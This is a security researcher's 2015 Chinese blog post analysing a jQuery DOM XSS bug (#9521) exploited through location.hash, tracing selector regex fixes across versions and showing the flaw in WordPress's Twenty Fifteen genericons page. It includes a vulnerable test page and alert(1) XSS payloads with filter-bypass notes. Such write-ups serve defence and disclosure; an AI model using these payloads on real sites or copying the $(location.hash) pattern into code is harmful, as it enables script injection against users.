<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>jQuery 1.11.3 DomXSS Vulnerability - Linux.im</title>
    <meta name="description" content="Hacking for fun. - evi1m0"/>
    <link rel="stylesheet" href="/css/linux-im.css" type="text/css" />
    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
  </head>
  <body>
    <style>
      h1 {
        font-family: STFangSong, Helvetica, Arial, Vernada, Tahoma, STXihei, "Microsoft YaHei", "Songti SC", SimSun, Heiti, sans-serif;
      }
    </style>
    <div class="site">
      <div class="post-content" style="margin-top: -20px;">
        <div id="post">
          <h1 id="jquery-1113-domxss-vulnerability">jQuery 1.11.3 DomXSS Vulnerability</h1>
<p class="date">07 May 2015 - evi1m0</p>

<h4 id="info">Info</h4>

<p>听群里说 WordPress 又爆跨站漏洞了：《<a href="http://wptavern.com/xss-vulnerability-in-jetpack-and-the-twenty-fifteen-default-theme-affects-millions-of-wordpress-users">XSS Vulnerability in Jetpack and the Twenty Fifteen Default Theme Affects Millions of WordPress Users</a> 》，分析发现原来是 jQuery 老版本的 DOM XSS 漏洞【<a href="http://bugs.jquery.com/ticket/9521">Bug #9521</a>】。</p>

<p>11 年 dmethvin 提交 jQuery 1.6.1 版本的 Ticket #9521 , 其原因是由 <code>$() | jQuery()</code> 预期的 CSS 选择器在其他情况下可以用于创建 HTML 元素，如果编码不当（事实上很多编码不当的情况），将会导致产生 DomXSS 漏洞。</p>

<h4 id="example-jquery-161">Example （jQuery 1.6.1）</h4>

<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;jQuery DomXSS test&lt;/title&gt;
    &lt;script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"&gt;&lt;/script&gt;
    &lt;script&gt;
        $(location.hash);
    &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
Hello, jQuery.
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<center><img src="http://ww4.sinaimg.cn/large/c334041bjw1ervyaxebxmj20gu07h74q.jpg" /></center>

<h4 id="wordpress-default-themes-twentyfifteen-example">WordPress default themes twentyfifteen example</h4>

<p>example.html 297-299 lines:</p>

<pre><code>// set permalink
var permalink = cssclass.split(' genericon-')[1];
window.location.hash = permalink;
</code></pre>

<p>console.log permalink:</p>

<ul>
  <li>http://linux.im/wp-content/themes/twentyfifteen/genericons/example.html#123</li>
  <li>console.log(permalink): genericon-123</li>
</ul>

<p>335-343 lines:</p>

<pre><code>// pick random icon if no permalink, otherwise go to permalink
if ( window.location.hash ) {
    permalink = "genericon-" + window.location.hash.split('#')[1];
    attr = jQuery( '.' + permalink ).attr( 'alt' );
    cssclass = jQuery( '.' + permalink ).attr('class');
    displayGlyph( attr, cssclass );
} else {
    pickRandomIcon();
}
</code></pre>

<p>如果存在 window.location.hash 则拼接 permalink 并使用 jQuery 进行属性操作，问题出现，当我们将 location.hash 设置为 <code>&lt;img src=@ onerror=alert(1)&gt;</code> 时，导致跨站。</p>

<h4 id="jquery-161-source">jQuery 1.6.1 Source</h4>

<pre><code>&gt;_ $
jquery.js:25 function ( selector, context ) {
        // The jQuery object is actually just the init constructor 'enhanced'
        return new jQuery.fn.init( selector, context, rootjQuery );
    }

&gt;_ jQuery.fn.init
jquery.js:93 function ( selector, context, rootjQuery ) {
        var match, elem, ret, doc;

        // Handle $(""), $(null), or $(undefined)
        if ( !selector ) {
            return this;
        }

        // Handle $(DOMElement)
        if ( selector.nodeType ) {
            this.context = this[0] = selector;
            this.length = 1;
            return this;
        }
......
        if (selector.selector !== undefined) {
            this.selector = selector.selector;
            this.context = selector.context;
        }

        return jQuery.makeArray( selector, this );
    }
</code></pre>

<p>其中 jQuery.fn.init :</p>

<pre><code>if ( typeof selector === "string" ) {
    // Are we dealing with HTML string or an ID?
    if ( selector.charAt(0) === "&lt;" &amp;&amp; selector.charAt( selector.length - 1 ) === "&gt;" &amp;&amp; selector.length &gt;= 3 ) {
        // Assume that strings that start and end with &lt;&gt; are HTML and skip the regex check
        match = [ null, selector, null ];

    } else {
        match = quickExpr.exec( selector );
    }
</code></pre>

<p>quickExpr 对 selector 进行过滤，正则为：</p>

<pre><code>quickExpr = /^(?:[^&lt;]*(&lt;[\w\W]+&gt;)[^&gt;]*$|#([\w\-]*)$)/,
</code></pre>

<p>显然我们上面的 Payload 是能通过的。</p>

<h4 id="jquery-172-source">jQuery 1.7.2 Source</h4>

<p>当时漏洞报告者在 #9521 中提到修复方案：</p>

<pre><code>the quick patch by jquery is here
-       quickExpr = /^(?:[^&lt;]*(&lt;[\w\W]+&gt;)[^&gt;]*$|#([\w\-]*)$)/,
+       quickExpr = /^(?:[^#&lt;]*(&lt;[\w\W]+&gt;)[^&gt;]*$|#([\w\-]*)$)/,
</code></pre>

<p>尽管在开始的 Example 代码中不能生效，但由于程序开发人员的编码习惯显然按照上面的修复并没什么卵用，修复后原有的攻击代码效果：</p>

<pre><code>&gt;_ location.hash
"#test&lt;img src=1 onerror=alert(1)&gt;"

&gt;_$(location.hash)
[]
</code></pre>

<p>因为正则新增 # 的原因导致增加失败，在真实环境中属性或其他操作直接使用 location.hash 的可能性叫小，开发人员以及业务需求使得上面的修复方案没有意义，例如开始提到的 WordPress Default Themes XSS 漏洞 337 行：</p>

<pre><code>permalink = "genericon-" + window.location.hash.split('#')[1];
</code></pre>

<p>程序将获取到的 hash [‘#test111’] split 后，只保存 test111 ，也就使得我们能忽略到 1.7.2 的修复。</p>

<h4 id="jquery-1113-source">jQuery 1.11.3 Source</h4>

<p>在前面版本中其实能够得以证明 jQuery 团队确实修复 #9521 的问题就是 quickExpr 的上方注释：</p>

<pre><code>// A simple way to check for HTML strings or ID strings
// Prioritize #id over &lt;tag&gt; to avoid XSS via location.hash (#9521)
quickExpr = /^(?:[^#&lt;]*(&lt;[\w\W]+&gt;)[^&gt;]*$|#([\w\-]*)$)/,
</code></pre>

<p>可能开发团队遇到了 1.7.2 中我提到问题的尴尬窘境，他们在 1.11.3 又对其进行了升级：</p>

<pre><code>rquickExpr = /^(?:\s*(&lt;[\w\W]+&gt;)[^&gt;]*|#([\w-]*))$/,
</code></pre>

<p>看到这个正则我几乎无语，开头使用 <code>&lt;</code> 就能轻易绕过：</p>

<center><img src="http://ww3.sinaimg.cn/large/c334041bjw1ervz9q9wc6j20iq08q75b.jpg" /></center>

<p>终于，他们在 2.x 系列正式修复了这个问题：</p>

<pre><code>rquickExpr = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
</code></pre>

<h4 id="other-browser">Other browser</h4>

<p>如你所见，上面这些 Payload 并不会在 Safari 中成效，通过调试即可发现 Chrome 未对 location.hash 部分进行 URL 编码处理进入函数，而 Safari 会经过 URL 编码进入函数，是这样的：</p>

<center><img src="http://ww4.sinaimg.cn/large/c334041bjw1ervzemufpaj20dm03hdg7.jpg" /></center>

<p>但是我们仍然可以使用 html5 的一些特性，引发错误并 onerror 出来：</p>

<pre><code>file:///Users/evi1m0/Desktop/1.html#&lt;video&gt;&lt;source/onerror=alert(1)&gt;
</code></pre>

<center><img src="http://ww2.sinaimg.cn/large/c334041bjw1ervzj68uw7j21400mk41n.jpg" /></center>

        </div>
      </div>

      <div id="disqus_thread"></div>
      <script type="text/javascript">
        var disqus_shortname = 'evi1m0';
        (function() {
          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>
      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

      <!-- footer -->
      <div class="footer">
        <div class="contact">
          <p>
            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
            <a href="http://weibo.com/Evi1m0" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
            <a href="mailto:evi1m0.bat@gmail.com">evi1m0.bat@gmail.com</a>
          </p>
        </div>
      </div>
    </div>

    <div style="display: none;">
      <script src="http://s4.cnzz.com/z_stat.php?id=1254574847&web_id=1254574847" language="JavaScript"></script>
    </div>
  </body>
</html>
